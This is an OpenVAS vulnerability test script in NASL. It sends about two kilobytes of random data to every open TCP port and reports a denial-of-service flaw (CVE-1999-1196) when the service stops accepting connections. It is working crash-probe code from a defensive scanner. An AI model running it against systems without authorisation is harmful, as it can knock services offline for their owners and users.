###############################################################################
# OpenVAS Vulnerability Test
# $Id: random_crap_DoS.nasl 6046 2017-04-28 09:02:54Z teissa $
#
# Kill service with random data
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17296");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(158);
  script_cve_id("CVE-1999-1196");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Kill service with random data");
  # Maybe we should set this to ACT_DESTRUCTIVE_ATTACK only?
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2005 Michel Arboi");
  script_family("Denial of Service");
  script_mandatory_keys("TCP/PORTS");
  script_dependencies("find_service.nasl", "find_service2.nasl", "secpod_open_tcp_ports.nasl");

  script_tag(name:"solution", value:"Upgrade your software or contact your vendor and inform it of this
  vulnerability.");

  script_tag(name:"summary", value:"It was possible to crash the remote service by sending it
  a few kilobytes of random data.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make this service crash continuously,
  preventing this service from working properly. It may also be possible
  to exploit this flaw to execute arbitrary code on this host.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

beurk = '';
for( i = 0; i < 256; i ++ ) {
  beurk = strcat( beurk,
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256),
  ord(rand() % 256), ord(rand() % 256), ord(rand() % 256), ord(rand() % 256) );
 # 2 KB
}

port = get_all_tcp_ports();

soc = open_sock_tcp( port );
if( soc ) {

  send( socket:soc, data:beurk );
  close(soc);

  # Is the service still alive?
  # Retry just in case it is rejecting connections for a while
  for( i = 1; i <= 3; i ++ ) {
    soc = open_sock_tcp( port );
    if( soc ) break;
    sleep( i );
  }
  if( ! soc ) {
    security_message( port:port );
  } else {
    close( soc );
  }
}

exit( 0 );